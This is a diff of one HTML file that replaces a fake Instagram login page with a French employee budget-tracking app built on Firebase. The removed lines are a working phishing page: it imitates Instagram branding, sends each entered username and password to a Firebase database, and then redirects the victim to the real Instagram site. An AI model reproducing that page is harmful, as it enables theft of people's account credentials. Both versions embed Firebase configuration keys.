@@ -1,130 +1,253 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Video</title>
-
-    <style>
-        body {
-            background-color: #000;
-            color: white;
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            flex-direction: column;
-        }
-        .login-container {
-            background-color: #121212;
-            padding: 40px;
-            border-radius: 10px;
-            text-align: center;
-        }
-        .logo {
-            width: 60px;
-            margin-bottom: 20px;
-        }
-        input {
-            display: block;
-            width: 250px;
-            padding: 10px;
-            margin: 10px auto;
-            border: none;
-            border-radius: 5px;
-        }
-        button {
-            background-color: #0095f6;
-            color: white;
-            border: none;
-            padding: 12px;
-            width: 100%;
-            border-radius: 5px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-        a {
-            color: #0095f6;
-            text-decoration: none;
-            display: block;
-            margin-top: 15px;
-        }
-        .meta {
-            margin-top: 20px;
-            font-size: 12px;
-            color: gray;
-        }
-    </style>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>📊 Suivi des Budgets</title>
+  <!-- Bootstrap 5 CSS -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css"
+        rel="stylesheet">
+  <style>
+    body { padding: 2rem; }
+    #employee-list .active { background-color: #0d6efd; color: #fff; }
+  </style>
 </head>
+
 <body>
-    <div class="login-container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
-        <input type="text" id="username" placeholder="Username or Email">
-        <input type="password" id="password" placeholder="Password">
-        <button id="login-btn">Log in</button>
-        <a href="#">Forgotten password?</a>
-        <button id="create-btn" style="margin-top: 15px; background: none; border: 1px solid gray; color: white;">Create new account</button>
-        <div class="meta">Meta</div>
+  <div class="container">
+    <h1 class="mb-4">📊 Suivi des Budgets</h1>
+    <div class="row">
+
+      <!-- Colonne Employés -->
+      <div class="col-lg-4 mb-4">
+        <div class="card">
+          <div class="card-header">👥 Employés</div>
+          <div class="card-body">
+            <form id="add-employee-form" class="d-flex mb-3">
+              <input type="text" id="new-employee-name"
+                     class="form-control me-2"
+                     placeholder="Nom de l’employé" required>
+              <button class="btn btn-primary">Ajouter</button>
+            </form>
+            <ul class="list-group" id="employee-list"></ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- Colonne Transactions -->
+      <div class="col-lg-8">
+        <div id="transaction-section" class="d-none">
+          <div class="card mb-3">
+            <div class="card-header">
+              💰 Opérations pour <strong><span id="current-employee"></span></strong>
+            </div>
+            <div class="card-body">
+
+              <!-- Ajouter une opération -->
+              <form id="add-transaction-form" class="d-flex mb-3">
+                <input type="number" step="0.01" id="transaction-amount"
+                       class="form-control me-2"
+                       placeholder="Montant (MAD)" required>
+                <button class="btn btn-success">Ajouter</button>
+              </form>
+
+              <!-- Tableau des opérations -->
+              <div class="table-responsive">
+                <table class="table table-striped mb-0">
+                  <thead>
+                    <tr>
+                      <th>#</th>
+                      <th>Montant</th>
+                      <th>Date</th>
+                      <th></th>
+                    </tr>
+                  </thead>
+                  <tbody id="transaction-list"></tbody>
+                </table>
+              </div>
+            </div>
+            <div class="card-footer text-end">
+              <h5>Total : <span id="transaction-total">0,00 MAD</span></h5>
+            </div>
+          </div>
+        </div>
+        <p id="no-employee-selected" class="text-muted">
+          Sélectionnez ou ajoutez un employé pour commencer.
+        </p>
+      </div>
+
     </div>
+  </div>
 
-    <!-- Firebase and app logic -->
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-app.js";
-        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.22.2/firebase-database.js";
+  <!-- Firebase + logique de l’appli -->
+  <script type="module">
+    import { initializeApp }        from 'https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js';
+    import { getDatabase, ref,
+             push, remove, update,
+             onValue }              from 'https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js';
 
-        const firebaseConfig = {
-            apiKey: "AIzaSyAEG5nw9xc5pK-0k9a5fSXUqw9JKi9RvdI",
-            authDomain: "getting-6e14c.firebaseapp.com",
-            databaseURL: "https://getting-6e14c-default-rtdb.firebaseio.com",
-            projectId: "getting-6e14c",
-            storageBucket: "getting-6e14c.appspot.com",
-            messagingSenderId: "361620661482",
-            appId: "1:361620661482:web:dc36dfc6314e8368e1a393",
-            measurementId: "G-M0958KW3HY"
+    // ─── Votre config Firebase ─────────────────────────────────────────────────
+    const firebaseConfig = {
+      apiKey: "AIzaSyAuEjleb1rS_Vx2O3pjDufBxV8NcU0xB4w",
+      authDomain: "kicknegoss.firebaseapp.com",
+      databaseURL: "https://kicknegoss-default-rtdb.firebaseio.com",
+      projectId: "kicknegoss",
+      storageBucket: "kicknegoss.firebasestorage.app",
+      messagingSenderId: "785991740380",
+      appId: "1:785991740380:web:7a56f2f5f7d0e3ac4a7d19",
+      measurementId: "G-4DPQV5FMRV"
+    };
+    // ───────────────────────────────────────────────────────────────────────────
+
+    const app       = initializeApp(firebaseConfig);
+    const db        = getDatabase(app);
+    const empRef    = ref(db, 'employees');
+    const txRef     = ref(db, 'transactions');
+
+    // Helper pour formater en MAD/fr-MA
+    const formatMAD = amt =>
+      amt.toLocaleString('fr-MA', {
+        minimumFractionDigits: 2,
+        maximumFractionDigits: 2
+      }) + ' MAD';
+
+    // UI
+    const UI = {
+      empForm:   document.getElementById('add-employee-form'),
+      empInput:  document.getElementById('new-employee-name'),
+      empList:   document.getElementById('employee-list'),
+
+      txSection: document.getElementById('transaction-section'),
+      noEmpMsg:  document.getElementById('no-employee-selected'),
+      currEmp:   document.getElementById('current-employee'),
+      txForm:    document.getElementById('add-transaction-form'),
+      txInput:   document.getElementById('transaction-amount'),
+      txList:    document.getElementById('transaction-list'),
+      txTotal:   document.getElementById('transaction-total')
+    };
+
+    let employees    = {};
+    let transactions = {};
+    let selectedEmp  = { id: null, name: '' };
+
+    // — Ajouter un employé —
+    UI.empForm.addEventListener('submit', e => {
+      e.preventDefault();
+      const name = UI.empInput.value.trim();
+      if (!name) return;
+      push(empRef, { name })
+        .then(() => UI.empInput.value = '');
+    });
+
+    // — Écouter les employés —
+    onValue(empRef, snap => {
+      employees = snap.val() || {};
+      renderEmployees();
+    });
+
+    function renderEmployees() {
+      UI.empList.innerHTML = '';
+      Object.entries(employees).forEach(([id, {name}]) => {
+        const li = document.createElement('li');
+        li.className = 'list-group-item d-flex justify-content-between align-items-center';
+        if (id === selectedEmp.id) li.classList.add('active');
+
+        // Nom + click pour sélectionner
+        const span = document.createElement('span');
+        span.textContent = name;
+        span.style.cursor = 'pointer';
+        span.onclick = () => selectEmployee(id, name);
+        li.appendChild(span);
+
+        // Bouton Supprimer
+        const btn = document.createElement('button');
+        btn.className = 'btn btn-sm btn-outline-danger';
+        btn.textContent = 'Supprimer';
+        btn.onclick = async e => {
+          e.stopPropagation();
+          if (!confirm(`Supprimer ${name} et toutes ses opérations ?`)) return;
+          // 1) supprimer l'employé
+          await remove(ref(db, `employees/${id}`));
+          // 2) supprimer ses transactions
+          const updates = {};
+          Object.entries(transactions)
+            .filter(([_, tx]) => tx.empId === id)
+            .forEach(([txId]) => { updates[`transactions/${txId}`] = null; });
+          if (Object.keys(updates).length) {
+            await update(ref(db), updates);
+          }
+          // 3) si c'était lui le sélectionné, on réinitialise
+          if (selectedEmp.id === id) {
+            selectedEmp = { id: null, name: '' };
+            UI.txSection.classList.add('d-none');
+            UI.noEmpMsg.classList.remove('d-none');
+          }
         };
+        li.appendChild(btn);
 
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
+        UI.empList.appendChild(li);
+      });
+    }
 
-        document.getElementById('login-btn').addEventListener('click', () => {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+    function selectEmployee(id, name) {
+      selectedEmp = { id, name };
+      UI.currEmp.textContent    = name;
+      UI.txSection.classList.remove('d-none');
+      UI.noEmpMsg.classList.add  ('d-none');
+      renderEmployees();
+      renderTransactions();
+    }
 
-            const newLoginRef = push(ref(db, 'logins/'));
-            set(newLoginRef, {
-                username: username,
-                password: password,
-                timestamp: new Date().toISOString()
-            })
-            .then(() => {
-                console.log('Data written:', username, password);
+    // — Écouter les transactions —
+    onValue(txRef, snap => {
+      transactions = snap.val() || {};
+      renderTransactions();
+    });
 
-                const appUrl = `instagram://user?username=${encodeURIComponent(username)}`;
-                const webUrl = `https://www.instagram.com/${encodeURIComponent(username)}/`;
+    // — Ajouter une transaction —
+    UI.txForm.addEventListener('submit', e => {
+      e.preventDefault();
+      const amt = parseFloat(UI.txInput.value);
+      if (!selectedEmp.id || isNaN(amt)) return;
+      push(txRef, {
+        empId:     selectedEmp.id,
+        amount:    amt,
+        timestamp: Date.now()
+      }).then(() => UI.txInput.value = '');
+    });
 
-                // Create a hidden link to trigger the redirect
-                const a = document.createElement('a');
-                a.href = appUrl;
-                a.style.display = 'none';
-                document.body.appendChild(a);
-                a.click();
+    // — Afficher les transactions de l’employé sélectionné —
+    function renderTransactions() {
+      if (!selectedEmp.id) return;
+      const txEntries = Object.entries(transactions)
+        .filter(([_, tx]) => tx.empId === selectedEmp.id)
+        .sort((a,b) => a[1].timestamp - b[1].timestamp);
 
-                // Fallback to browser if app doesn't open
-                setTimeout(() => {
-                    window.location.href = webUrl;
-                }, 1500);
-            })
-            .catch((error) => {
-                console.error('Error writing to database:', error);
-                alert('Failed to send data to database');
-            });
-        });
+      UI.txList.innerHTML = '';
+      let total = 0;
 
-        document.getElementById('create-btn').addEventListener('click', () => {
-            alert('Create account button clicked');
-        });
-    </script>
+      txEntries.forEach(([id, tx], idx) => {
+        total += tx.amount;
+        const tr = document.createElement('tr');
+        tr.innerHTML = `
+          <td>${idx+1}</td>
+          <td>${formatMAD(tx.amount)}</td>
+          <td>${new Date(tx.timestamp).toLocaleString('fr-MA')}</td>
+          <td>
+            <button class="btn btn-sm btn-danger">Supprimer</button>
+          </td>`;
+        tr.querySelector('button')
+          .onclick = () => remove(ref(db, `transactions/${id}`));
+        UI.txList.appendChild(tr);
+      });
+
+      UI.txTotal.textContent = formatMAD(total);
+    }
+  </script>
+
+  <!-- Bootstrap JS Bundle (facultatif) -->
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js">
+  </script>
 </body>
 </html>
 
